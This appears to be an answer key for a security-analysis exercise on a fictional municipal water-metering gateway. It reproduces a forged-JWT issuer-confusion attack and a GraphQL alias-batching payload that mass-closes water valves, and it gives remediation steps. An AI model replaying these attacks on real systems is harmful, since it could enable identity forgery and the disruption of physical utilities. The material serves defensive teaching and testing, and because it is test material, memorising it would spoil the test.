# Expected Response

## System
- **Name:** AquaGrid Municipal Cloud Gateway
- **Domain:** Smart City / Water Management / Advanced Metering Infrastructure (AMI)
- **Document version analysed:** 7.2.0 (FINAL) + implementation doc 4.1.1

---

## Priority Findings

### Finding 1 — SSO Issuer Confusion: Forged JWT Accepted via Attacker-Controlled JWKS (Pattern 2.4 — Privilege escalation via parameter tampering)
**Severity:** Critical / Identity Forgery
**Affected endpoint:** `POST https://api.aquagrid-municipal.cloud/graphql` (and all authenticated endpoints)
**Referenced in context:** Section 4.0 (BUG-CITY-019), Section 6.0 (Node.js middleware), HAR trace JWT header

**Summary:**
The Node.js SSO middleware (`requireCityAdminAuth`, Section 6.0) contains three sequential flaws that together allow any internet attacker to forge a valid session as a city administrator for any tenant:

1. **FLAW 1 (line 120–121):** The JWT is decoded *without* cryptographic verification using `jwt.decode(token, { complete: true })`, and the `iss` (Issuer) claim is extracted from this unverified payload. The `iss` claim is fully attacker-controlled.

2. **FLAW 2 (BUG-CITY-019, lines 123–129):** The server constructs a JWKS URI as `${dynamicIssuerUrl}/.well-known/jwks.json` using the unverified issuer. It does **not** look up `dynamicIssuerUrl` against the `tenants.sso_issuer_url` column in the `tenants` table before making the outbound request.

3. **FLAW 3 (lines 132–137):** The token signature is verified against the key downloaded from the attacker's JWKS endpoint. Since the attacker signed the token with their own private key, this verification passes perfectly.

**Evidence from HAR — JWT decode:**
The JWT from the HAR `authorization` header decodes to:
```
Header: {"alg":"RS256","typ":"JWT","kid":"public-key-1"}
Payload: {"iss":"https://dev-attacker.us.auth0.com/","sub":"attacker_99","role":"city_admin","tenant_id":"city_of_chicago_01"}
```
The `iss` domain `dev-attacker.us.auth0.com` is an attacker-controlled Auth0 free-tier tenant — not `login.microsoftonline.com/chicago-tenant-id/v2.0` (the legitimate Chicago issuer in the `tenants` table per Section 5.0). Despite this, the server accepted the token and executed 5,000 valve shut-off commands under `tenant_id: city_of_chicago_01`.

---

### Finding 2 — GraphQL Alias Batching: 5,000 Physical Valve Shut-offs in One HTTP Request (Pattern 5.3 — Resolver/graph traversal injection / DoS)
**Severity:** Critical / Physical Infrastructure Impact
**Affected endpoint:** `POST https://api.aquagrid-municipal.cloud/graphql` (mutation `setValveState`)
**Referenced in context:** Section 4.0 (RISK-CITY-019), Section 7.3 (alias payload), HAR trace

**Summary:**
The GraphQL schema (Section 7.0) exposes `setValveState(meterId: ID!, targetState: ValveState!)`. The AWS WAF rate limit blocks more than 10 HTTP requests per minute, but it does **not** inspect the GraphQL payload body. The Apollo router (Section 6.0 comment) processes all GraphQL aliases within a single document as individual resolver invocations.

The attacker exploits GraphQL alias syntax to pack 5,000 distinct `setValveState(targetState: CLOSED)` mutations into a single `POST /graphql` request (Section 7.3). The WAF counts this as 1 request and passes it. The GraphQL engine spawns 5,000 resolver chains concurrently.

**Evidence from HAR:**
- `bodySize: 425112` — 425 KB POST body containing 5,000 aliased mutations (vs. ~200 bytes for a normal single mutation per Section 7.2)
- `time: 8450` ms — 8.45 seconds response time (vs. expected 50–200ms), caused by 5,000 concurrent database inserts and LoRaWAN queue dispatches
- Response header: `x-graphql-resolver-warnings: Max depth/alias threshold exceeded. Processing anyway.` — server detected the anomaly but did not block it
- Response header: `x-lorawan-queue-depth: CRITICAL_HIGH` — physical LoRaWAN radio queue of neighborhood concentrators was flooded
- Response body confirms all aliases resolved: `victim1: {"status": "QUEUED_FOR_SHUTOFF"}`, `victim2: {"status": "QUEUED_FOR_SHUTOFF"}`, `victim3: {"status": "QUEUED_FOR_SHUTOFF"}` — meter IDs `MTR-10001` through `MTR-15000` were all queued for physical shut-off

---

## Evidence Map

| Artifact location | Finding 1 (SSO Forgery) | Finding 2 (Alias Batching) |
|---|---|---|
| Section 4.0 | BUG-CITY-019 — issuer URL not checked against whitelist | RISK-CITY-019 — alias batching not rate-limited |
| Section 6.0 | `jwt.decode` used before verification; dynamic JWKS URI from attacker payload | Apollo processes all aliases within single document |
| Section 7.3 | — | Shows 5,000 aliased mutations in one GraphQL document |
| HAR JWT payload | `iss: https://dev-attacker.us.auth0.com/` — rogue issuer | — |
| HAR bodySize | — | 425,112 bytes — anomalous for a single mutation |
| HAR time | — | 8,450 ms — indicates massive backend fan-out |
| HAR x-lorawan-queue-depth | — | `CRITICAL_HIGH` — physical IoT queue exhausted |
| HAR response body | Token accepted; `tenant_id: city_of_chicago_01` granted full access | All 5,000 meters: `QUEUED_FOR_SHUTOFF` |

---

## Steps to Reproduce

### Finding 1 — SSO Issuer Confusion

**Step 1 — Mint a forged JWT using an attacker-controlled Auth0 tenant**
Register a free account on Auth0 (or any OAuth2 provider). Configure an RS256 application. Generate a JWT with the following custom claims:
```json
{
  "iss": "https://dev-attacker.us.auth0.com/",
  "sub": "attacker_99",
  "role": "city_admin",
  "tenant_id": "city_of_chicago_01"
}
```
Sign with your own RS256 private key. Ensure your Auth0 tenant exposes `https://dev-attacker.us.auth0.com/.well-known/jwks.json` containing your corresponding public key.

**Step 2 — Submit the forged token to the AquaGrid GraphQL endpoint**
```
POST https://api.aquagrid-municipal.cloud/graphql
Authorization: Bearer <FORGED_JWT>
Content-Type: application/json

{"query": "query { listMeters(tenantId: \"city_of_chicago_01\") { meterId serviceAddress currentValveState } }"}
```
**Vulnerable outcome:** `200 OK` returning meter inventory for `city_of_chicago_01`. The middleware accepted the forged token because the signature was valid against the attacker's own JWKS.
**Secure outcome:** `403 Forbidden` — `{"error": "Invalid Token"}` because the `iss` claim `dev-attacker.us.auth0.com` is not present in the `tenants.sso_issuer_url` column.

**Step 3 — Verify using actual HAR JWT**
Decode the HAR Authorization header token. The payload base64-decodes to:
`{"iss":"https://dev-attacker.us.auth0.com/","sub":"attacker_99","role":"city_admin","tenant_id":"city_of_chicago_01"}`
This confirms the attack is reproducible with a rogue Auth0 tenant. The `kid: public-key-1` in the JWT header matches the key the server would have fetched from `https://dev-attacker.us.auth0.com/.well-known/jwks.json`.

---

### Finding 2 — GraphQL Alias Batching

**Step 1 — Verify normal single-mutation baseline**
```
POST https://api.aquagrid-municipal.cloud/graphql
Authorization: Bearer <FORGED_OR_LEGITIMATE_ADMIN_JWT>
Content-Type: application/json

{"query": "mutation ShutOffSingleMeter { setValveState(meterId: \"MTR-10045\", targetState: CLOSED) { status queuedAt } }"}
```
Expected: `200 OK`, response time ~50–200ms, single meter entry in response.

**Step 2 — Submit mass alias payload (HAR replay)**
```
POST https://api.aquagrid-municipal.cloud/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InB1YmxpYy1rZXktMSJ9.eyJpc3MiOiJodHRwczovL2Rldi1hdHRhY2tlci51cy5hdXRoMC5jb20vIiwic3ViIjoiYXR0YWNrZXJfOTkiLCJyb2xlIjoiY2l0eV9hZG1pbiIsInRlbmFudF9pZCI6ImNpdHlfb2ZfY2hpY2Fnb18wMSJ9...
Content-Type: application/json

{"query": "mutation MassShutoffAttack { victim1: setValveState(meterId: \"MTR-10001\", targetState: CLOSED) { status queuedAt } victim2: setValveState(meterId: \"MTR-10002\", targetState: CLOSED) { status queuedAt } victim3: setValveState(meterId: \"MTR-10003\", targetState: CLOSED) { status queuedAt } /* ... 4,997 additional aliases ... */ }"}
```
**Vulnerable outcome (confirmed by HAR):**
- Response time: ~8,450ms
- Response header: `x-graphql-resolver-warnings: Max depth/alias threshold exceeded. Processing anyway.`
- Response header: `x-lorawan-queue-depth: CRITICAL_HIGH`
- Response body: all aliased mutations return `status: "QUEUED_FOR_SHUTOFF"`
- 5,000 physical water valves begin closing

**Secure outcome:** One of the following:
- `400 Bad Request` with alias count limit exceeded before resolver execution
- `429 Too Many Requests` based on mutation count, not HTTP request count

---

## Remediation

**Finding 1 (SSO Issuer Confusion):**
1. Before fetching JWKS, perform an allowlist check: `SELECT sso_issuer_url FROM tenants WHERE sso_issuer_url = :decoded_iss AND is_active = TRUE`. If no row returns, reject the token immediately. This fixes BUG-CITY-019.
2. Never use `jwt.decode` (unverified) to extract values used for trust decisions — only use claims from `jwt.verify` output.
3. Pin the JWKS URI at provisioning time per tenant — do not derive it dynamically from the token at runtime.

**Finding 2 (GraphQL Alias Batching):**
1. Implement server-side alias count limiting in Apollo: `persistedQueries` + `depthLimit` + `costLimit` middleware that counts aliases as individual operations for rate-limit purposes.
2. Configure the WAF to inspect `Content-Length` and `bodySize` — flag and throttle requests exceeding a threshold (e.g., 10 KB for mutation payloads).
3. Add a maximum mutations-per-document limit in the Valve Actuation subgraph resolver (e.g., 10 mutations per authenticated request).
4. The `x-graphql-resolver-warnings` header shows the server detects the threshold but proceeds — change this to abort processing and return `429`.
